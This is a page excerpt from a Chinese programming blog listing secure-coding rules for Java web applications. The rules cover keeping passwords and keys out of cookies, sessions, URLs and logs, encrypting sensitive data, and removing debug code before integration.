	<div class="content list__excerpt post__content clearfix">
		1、不能任意在Cookie、Session、ServletContext中存放数据，对于这些对象中存放的数据，必须有统一定义、说明、Lifecycle的管理等。
2、对于敏感信息都必须保障其私密性。
在页面显示、操作交互中不可避免的会有一些如用户的标识信息、密码、帐号信息、涉及的金额信息等敏感数据(保密性的数据)的存在。为保障这些数据不被曝露而提高安全性，我们要做到所有敏感信息必须进行加密处理，不能以明文的形式存在于任何网络、内存及其它持久化介质中(如：数据库、文件磁盘系统等)。
3、所有的密码、key、帐号等机密信息都不能在URL中传递。
4、所有的密码、key、银行账号等机密信息都不能存储到Cookie，Session、ServletContext中。
5、防止信息泄漏：
在系统上线使用的log level对应的日志输出中不允许包含任何密码、key、账号等机密信息。SVN集成分支上的代码中不允许存留可用的system.out/err.print语句。在测试/调试阶段所使用的测试页面、单元测试模块等不允许提交到SVN集成分支上。不允许将系统产生的错误异常信息直接显示给用户，需要有统一的错误处理。 6、尽量减少不必要的信息传递。
在信息的传递过程中，如果当前Step中的对象、对象的属性、参数等在下一个Step中不需要，则不要再做传递，甚至可以显式的销毁。这样可以有效的减少信息被截获的机率，特别是敏感数据(例如用户密码、账户信息等等)。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/373/">«</a>
	<span class="pagination__item pagination__item--current">374/489</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/375/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>